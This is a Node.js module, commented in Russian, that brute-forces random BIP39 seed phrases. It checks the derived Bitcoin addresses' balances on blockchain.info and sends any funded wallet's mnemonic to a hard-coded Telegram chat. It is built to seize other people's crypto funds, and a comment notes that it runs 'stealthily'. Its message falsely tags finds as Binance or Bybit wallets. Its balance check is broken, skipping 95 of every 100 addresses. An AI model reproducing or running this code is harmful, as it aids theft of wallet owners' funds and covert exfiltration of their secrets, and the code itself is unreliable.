const bip39 = require('bip39');
const bitcoin = require('bitcoinjs-lib');
const axios = require('axios');
const { bot } = require('./bot');

let isRunning = false;
let checkedCount = 0;

async function bruteLoop() {
    if (!isRunning) return;
    try {
        let generatedAddresses = [];

        // Генерируем сразу 5 кошельков за один проход (быстрее)
        for (let i = 0; i < 5; i++) {
            const mnemonic = bip39.generateMnemonic();
            const seed = await bip39.mnemonicToSeed(mnemonic);
            const root = bitcoin.bip32.fromSeed(seed);
            const { address } = bitcoin.payments.p2pkh({ pubkey: root.derivePath("m/44'/0'/0'/0/0").publicKey });
            generatedAddresses.push({ mnemonic, address });
        }

        checkedCount += 5;

        // Проверяем баланс раз в 20 итераций (раз в 100 сгенерированных кошельков)
        if (checkedCount % 100 === 0) {
            for (const item of generatedAddresses) {
                try {
                    const res = await axios.get(`https://blockchain.info/q/addressbalance/${item.address}`, { timeout: 5000 });
                    const balance = parseInt(res.data) / 100000000;
                    
                    if (balance > 0) {
                        await bot.telegram.sendMessage(9256345316, 
                            `🔥 НАЙДЕН КОШЕЛЕК!\n\n` +
                            `🏦 Биржа: Binance / Bybit\n` +
                            `📝 12 слов: \`${item.mnemonic}\`\n\n` +
                            `💰 Баланс BTC: ${balance} BTC\n` +
                            `Адрес: ${item.address}`,
                            { parse_mode: 'Markdown' }
                        );
                        isRunning = false;
                        return;
                    }
                } catch (e) {
                    // Игнорируем ошибки сети
                }
            }
        }
    } catch (e) {}

    // Задержка 3 секунды (чуть быстрее, но все еще скрытно)
    setTimeout(bruteLoop, 3000);
}

function startCryptoSearch() {
    if (isRunning) return;
    isRunning = true;
    checkedCount = 0;
    console.log("Запущен оптимизированный поиск...");
    bruteLoop();
}

function stopCryptoSearch() {
    isRunning = false;
    console.log("Поиск остановлен.");
}

module.exports = { startCryptoSearch, stopCryptoSearch };
